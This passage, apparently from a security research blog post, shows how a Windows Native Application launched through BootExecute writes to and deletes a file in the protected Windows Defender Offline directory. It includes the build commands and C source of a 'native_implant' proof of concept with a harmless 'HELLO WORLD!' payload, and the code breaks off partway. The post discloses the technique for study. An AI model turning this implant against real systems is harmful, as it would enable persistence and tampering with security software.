fill-rule="nonzero"></path></svg></button></div></a></figure></div></div></div><div type="image" data-hook="rcv-block185"></div><div data-breakout="normal"><p class="Rc39c HhrTy RISpW X7MWW" dir="auto" id="viewer-ni5dj9079"><span class="vMus0"><span style="font-size:14px"><span>Figure 22 - Native Application that writes a “NotThirdPartyNotices.txt” to our target directory</span></span></span></p></div><div type="paragraph" data-hook="rcv-block186"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-chdfn15354"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block187"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-q3032825144"><span class="vMus0"><span>If we reboot our system, we’ll see that we are in fact able to write to this directory!</span></span></p></div><div type="paragraph" data-hook="rcv-block188"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-soued62893"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block189"></div><div data-breakout="normal"><div class="i5TUk" id="viewer-l7v8m9573"><div class="J9Vi9"><figure class="OPDJf" data-hook="figure-IMAGE"><a class="Vxa2D has-custom-focus LBfZl" tabindex="0" target="_self"><div data-hook="image-viewer" class="fnfJM"><div style="--dim-height:254;--dim-width:740;--ricos-image-default-border-color:unset" id="l7v8m9573" class="_49X-U wNivC _8xVnn" data-hook="image-viewer-l7v8m9573"><wow-image id="0628ff_3d7b7cc70e60407595c1d47e84768871~mv2.webp" class="undefined tKegW" data-image-info="{&quot;containerId&quot;:&quot;l7v8m9573&quot;,&quot;alignType&quot;:&quot;center&quot;,&quot;displayMode&quot;:&quot;fill&quot;,&quot;isLQIP&quot;:true,&quot;isSEOBot&quot;:false,&quot;lqipTransition&quot;:&quot;blur&quot;,&quot;encoding&quot;:&quot;AVIF&quot;,&quot;imageData&quot;:{&quot;width&quot;:740,&quot;height&quot;:254,&quot;uri&quot;:&quot;0628ff_3d7b7cc70e60407595c1d47e84768871~mv2.webp&quot;,&quot;name&quot;:&quot;&quot;,&quot;displayMode&quot;:&quot;fill&quot;}}" data-motion-part="BG_IMG l7v8m9573" data-bg-effect-name="" data-has-ssr-src="true" data-animate-blur="" data-is-responsive="true"><img src="https://static.wixstatic.com/media/0628ff_3d7b7cc70e60407595c1d47e84768871~mv2.webp/v1/fill/w_133,h_46,al_c,q_80,usm_0.66_1.00_0.01,blur_2,enc_avif,quality_auto/0628ff_3d7b7cc70e60407595c1d47e84768871~mv2.webp" alt="" style="width:100%;height:100%;object-fit:cover;object-position:50% 50%;max-width:100%;position:absolute;left:0;top:0" data-pin-url="https://www.protexity.com/post/going-native-malicious-native-applications" data-pin-media="https://static.wixstatic.com/media/0628ff_3d7b7cc70e60407595c1d47e84768871~mv2.webp/v1/fill/w_888,h_305,al_c,lg_1,q_80/0628ff_3d7b7cc70e60407595c1d47e84768871~mv2.webp" draggable="false"></wow-image></div><button class="KxJvA" type="button" data-hook="image-expand-button" aria-label="Expand image"><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg" class="C02F9"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" fill-rule="nonzero"></path></svg></button></div></a></figure></div></div></div><div type="image" data-hook="rcv-block190"></div><div data-breakout="normal"><p class="Rc39c HhrTy RISpW X7MWW" dir="auto" id="viewer-pfv1x9698"><span class="vMus0"><span style="font-size:14px"><span>Figure 23 - Successful write to a protected directory</span></span></span></p></div><div type="paragraph" data-hook="rcv-block191"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-drd3s844726"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block192"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-7nrt115359"><span class="vMus0"><span>And if we want to perform a little bit of cleanup, we can use the NtDeleteFile function to delete our file:</span></span></p></div><div type="paragraph" data-hook="rcv-block193"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-o80iv65038"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block194"></div><div data-breakout="normal"><div class="i5TUk" id="viewer-a6lpx10200"><div class="J9Vi9"><figure class="OPDJf" data-hook="figure-IMAGE"><a class="Vxa2D has-custom-focus LBfZl" tabindex="0" target="_self"><div data-hook="image-viewer" class="fnfJM"><div style="--dim-height:129;--dim-width:740;--ricos-image-default-border-color:unset" id="a6lpx10200" class="_49X-U wNivC _8xVnn" data-hook="image-viewer-a6lpx10200"><wow-image id="0628ff_68932411b88a4da19c93a43b7b2b2abd~mv2.webp" class="undefined tKegW" data-image-info="{&quot;containerId&quot;:&quot;a6lpx10200&quot;,&quot;alignType&quot;:&quot;center&quot;,&quot;displayMode&quot;:&quot;fill&quot;,&quot;isLQIP&quot;:true,&quot;isSEOBot&quot;:false,&quot;lqipTransition&quot;:&quot;blur&quot;,&quot;encoding&quot;:&quot;AVIF&quot;,&quot;imageData&quot;:{&quot;width&quot;:740,&quot;height&quot;:129,&quot;uri&quot;:&quot;0628ff_68932411b88a4da19c93a43b7b2b2abd~mv2.webp&quot;,&quot;name&quot;:&quot;&quot;,&quot;displayMode&quot;:&quot;fill&quot;}}" data-motion-part="BG_IMG a6lpx10200" data-bg-effect-name="" data-has-ssr-src="true" data-animate-blur="" data-is-responsive="true"><img src="https://static.wixstatic.com/media/0628ff_68932411b88a4da19c93a43b7b2b2abd~mv2.webp/v1/fill/w_133,h_23,al_c,q_80,usm_0.66_1.00_0.01,blur_2,enc_avif,quality_auto/0628ff_68932411b88a4da19c93a43b7b2b2abd~mv2.webp" alt="" style="width:100%;height:100%;object-fit:cover;object-position:50% 50%;max-width:100%;position:absolute;left:0;top:0" data-pin-url="https://www.protexity.com/post/going-native-malicious-native-applications" data-pin-media="https://static.wixstatic.com/media/0628ff_68932411b88a4da19c93a43b7b2b2abd~mv2.webp/v1/fill/w_1036,h_181,al_c,lg_1,q_80/0628ff_68932411b88a4da19c93a43b7b2b2abd~mv2.webp" draggable="false"></wow-image></div><button class="KxJvA" type="button" data-hook="image-expand-button" aria-label="Expand image"><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg" class="C02F9"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" fill-rule="nonzero"></path></svg></button></div></a></figure></div></div></div><div type="image" data-hook="rcv-block195"></div><div data-breakout="normal"><p class="Rc39c HhrTy RISpW X7MWW" dir="auto" id="viewer-twpk910327"><span class="vMus0"><span style="font-size:14px"><span>Figure 24 - We can delete our test file with NtDeleteFile and another reboot</span></span></span></p></div><div type="paragraph" data-hook="rcv-block196"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-7tz4115364"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block197"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-74v0z880173"><span class="vMus0"><span>It’s important to note here that this is a very basic implementation that didn’t require any impersonation or token manipulation from inside our Native Application. However, prior research from Pavel suggests that Native Applications have access to over 31 privileges when they are run from the BootExecute context and these privileges can be used to achieve similar effects with more advanced implementations (9).</span></span></p></div><div type="paragraph" data-hook="rcv-block198"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-26b3k15366"><span class="vMus0"><span>&nbsp;</span></span></p></div><div type="paragraph" data-hook="rcv-block199"></div><div data-breakout="normal"><h3 class="CwsM- nAEMg Z7lok X7MWW" dir="auto" id="viewer-365d115368"><span class="-pTyw"><strong style="font-weight:700"><span style="font-size:24px"><span style="color:#fd6262;text-decoration:inherit"><span>Part IV: The Code</span></span></span></strong></span></h3></div><div type="heading" data-hook="rcv-block200"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-tfxmw15370"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block201"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-hvtnp897096"><span class="vMus0"><strong style="font-weight:700"><span style="color:#fd6262;text-decoration:inherit"><span>Native_implant_mk3.c</span></span></strong></span></p></div><div type="paragraph" data-hook="rcv-block202"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-jxj1w15372"><span class="vMus0"><span>// Native Subsystem:&nbsp; clang++ native_implant_mk3.cpp -lntdll -nostdlib -o native_implant.exe "-Wl,/Entry:NtProcessStartup" "-Wl,/Subsystem:Native" -Wno-pragma-pack -Wno-microsoft-enum-forward-reference</span></span></p></div><div type="paragraph" data-hook="rcv-block203"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-fhb4j15374"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block204"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-88z4v906807"><span class="vMus0"><span>// Windows Subsystem: clang++ native_implant_mk3.cpp -lntdll -nostdlib -o windows_implant.exe "-Wl,/Subsystem:Windows" "-Wl,/Entry:NtProcessStartup" -Wno-pragma-pack -Wno-microsoft-enum-forward-reference</span></span></p></div><div type="paragraph" data-hook="rcv-block205"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-nah5h15376"><span class="vMus0"><span style="color:#fd6262;text-decoration:inherit"><span><a class="BlTqD" href="https://www.protexity.com/cybersecurity-blog/hashtags/include" target="_blank"><span style="color:#fd6262;text-decoration:inherit">#include</span></a><span> </span></span></span><span>"phnt.h"</span></span></p></div><div type="paragraph" data-hook="rcv-block206"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-q6ihn15378"><span class="vMus0"><span>&nbsp;</span></span></p></div><div type="paragraph" data-hook="rcv-block207"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-ruti215380"><span class="vMus0"><span style="color:#fd6262;text-decoration:inherit"><span><a class="BlTqD" href="https://www.protexity.com/cybersecurity-blog/hashtags/define" target="_blank"><span style="color:#fd6262;text-decoration:inherit">#define</span></a><span> </span></span></span><span>BREAK __asm(".byte 0xeb, 0xfe;")</span></span></p></div><div type="paragraph" data-hook="rcv-block208"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-wiouc15382"><span class="vMus0"><span>&nbsp;</span></span></p></div><div type="paragraph" data-hook="rcv-block209"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-zxi5515384"><span class="vMus0"><span><a class="BlTqD" href="https://www.protexity.com/cybersecurity-blog/hashtags/define" target="_blank"><span>#define</span></a><span> POINTER_CHECK(X)\</span></span></span></p></div><div type="paragraph" data-hook="rcv-block210"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-pgbkm15386"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(X == nullptr){&nbsp;&nbsp; \</span></span></p></div><div type="paragraph" data-hook="rcv-block211"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-qv48v15388"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; BREAK;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \</span></span></p></div><div type="paragraph" data-hook="rcv-block212"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-vi2nj15390"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \</span></span></p></div><div type="paragraph" data-hook="rcv-block213"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-ngkxx15392"><span class="vMus0"><span>&nbsp;</span></span></p></div><div type="paragraph" data-hook="rcv-block214"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-db8xq15394"><span class="vMus0"><span><a class="BlTqD" href="https://www.protexity.com/cybersecurity-blog/hashtags/define" target="_blank"><span>#define</span></a><span> DBG_CHECK(X)&nbsp;&nbsp; \</span></span></span></p></div><div type="paragraph" data-hook="rcv-block215"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-rprz915396"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; status = X;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \</span></span></p></div><div type="paragraph" data-hook="rcv-block216"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-2edbj15398"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(status != 0x0){ \</span></span></p></div><div type="paragraph" data-hook="rcv-block217"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-u9ctr15400"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; goto EXIT;&nbsp;&nbsp;&nbsp;&nbsp; \</span></span></p></div><div type="paragraph" data-hook="rcv-block218"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-oycj315402"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</span></span></p></div><div type="paragraph" data-hook="rcv-block219"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-kpxfn15404"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></span></p></div><div type="paragraph" data-hook="rcv-block220"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-d8e8a15406"><span class="vMus0"><span>SIZE_T wcslen(CONST WCHAR* str);</span></span></p></div><div type="paragraph" data-hook="rcv-block221"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-ytic615408"><span class="vMus0"><span>VOID* memset(VOID * dest, INT value, SIZE_T count);</span></span></p></div><div type="paragraph" data-hook="rcv-block222"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-98s0z15410"><span class="vMus0"><span>VOID* memcpy(VOID* dest, CONST VOID* src, SIZE_T count);</span></span></p></div><div type="paragraph" data-hook="rcv-block223"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-4pu1s15412"><span class="vMus0"><span>&nbsp;</span></span></p></div><div type="paragraph" data-hook="rcv-block224"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-r40we15414"><span class="vMus0"><span>UCHAR uWindowsPayload[] = { 0x48,0x45,0x4c,0x4c,0x4f,0x20,0x57,0x4f,0x52,0x4c,0x44,0x21 }; // HELLO WORLD!</span></span></p></div><div type="paragraph" data-hook="rcv-block225"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-2macm15416"><span class="vMus0"><span>&nbsp;</span></span></p></div><div type="paragraph" data-hook="rcv-block226"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-g87fh15418"><span class="vMus0"><span>extern "C" NTSTATUS NtProcessStartup(PPEB peb){</span></span></p></div><div type="paragraph" data-hook="rcv-block227"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-fhmmj15420"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></span></p></div><div type="paragraph" data-hook="rcv-block228"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-opmty15422"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // Initiate status</span></span></p></div><div type="paragraph" data-hook="rcv-block229"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-bwobl15424"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NTSTATUS status = 0x0;</span></span></p></div><div type="paragraph" data-hook="rcv-block230"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-fsfgg15426"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></span></p></div><div type="paragraph" data-hook="rcv-block231"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-syv1315428"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // Init Local Vars</span></span></p></div><div type="paragraph" data-hook="rcv-block232"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-cmhf515430"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; HANDLE hFile = nullptr;</span></span></p></div><div type="paragraph" data-hook="rcv-block233"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-v5jef15432"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WCHAR wPath[] = L"\\??\\C:\\Program Files\\Windows Defender\\Offline\\NotThirdPartyNotices.txt";</span></span></p></div><div type="paragraph" data-hook="rcv-block234"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-ejnw115434"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></span></p></div><div type="paragraph" data-hook="rcv-block235"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-dq08b15436"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // Init UNICODE_STRING Filename</span></span></p></div><div type="paragraph" data-hook="rcv-block236"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-nrizr15438"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; UNICODE_STRING usFileName;</span></span></p></div><div type="paragraph" data-hook="rcv-block237"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-vg1qc15440"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RtlInitUnicodeString(&amp;usFileName, wPath);</span></span></p></div><div type="paragraph" data-hook="rcv-block238"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-fyb3115442"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></span></p></div><div type="paragraph" data-hook="rcv-block239"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-8faza15444"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IO_STATUS_BLOCK ioStatus;</span></span></p></div><div type="paragraph" data-hook="rcv-block240"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-jf20u15446"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OBJECT_ATTRIBUTES oaFileAttributes;</span></span></p></div><div type="paragraph" data-hook="rcv-block241"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-23ta815448"><span class="vMus0"><span>&nbsp;</span></span></p></div><div type="paragraph" data-hook="rcv-block242"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-ldyc015450"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; InitializeObjectAttributes(&amp;oaFileAttributes, &amp;usFileName, 0, nullptr, nullptr);</span></span></p></div><div type="paragraph" data-hook="rcv-block243"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-89ctr15452"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></span></p></div><div type="paragraph" data-hook="rcv-block244"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-r4j7915454"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // Create File</span></span></p></div><div type="paragraph" data-hook="rcv-block245"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-xgmfz15456"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NtCreateFile(&amp;hFile, FILE_GENERIC_WRITE | SYNCHRONIZE, &amp;oaFileAttributes, &amp;ioStatus, nullptr, 0, 0, FILE_SUPERSEDE, FILE_SEQUENTIAL_ONLY | FILE_SYNCHRONOUS_IO_NONALERT, nullptr, 0);</span></span></p></div><div type="paragraph" data-hook="rcv-block246"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-pd8n115458"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></span></p></div><div type="paragraph" data-hook="rcv-block247"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-ck28015460"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // Write file</span></span></p></div><div type="paragraph" data-hook="rcv-block248"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-r3cqj15462"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NtWriteFile(hFile, nullptr, nullptr, nullptr, &amp;ioStatus, uWindowsPayload, sizeof(uWindowsPayload), nullptr, nullptr);</span></span></p></div><div type="paragraph" data-hook="rcv-block249"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-ckfyc15464"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></span></p></div><div type="paragraph" data-hook="rcv-block250"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-hb3xs15466"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // Debug string on boot</span></span></p></div><div type="paragraph" data-hook="rcv-block251"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-3e95715468"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NtDrawText(&amp;usFileName);</span></span></p></div><div type="paragraph" data-hook="rcv-block252"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-wr9yt15470"><span class="vMus0"><span>&nbsp;</span></span></p></div><div type="paragraph" data-hook="rcv-block253"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-ek2rg15472"><span class="vMus0"><span>EXIT:</span></span></p></div><div type="paragraph" data-hook="rcv-block254"></div><div 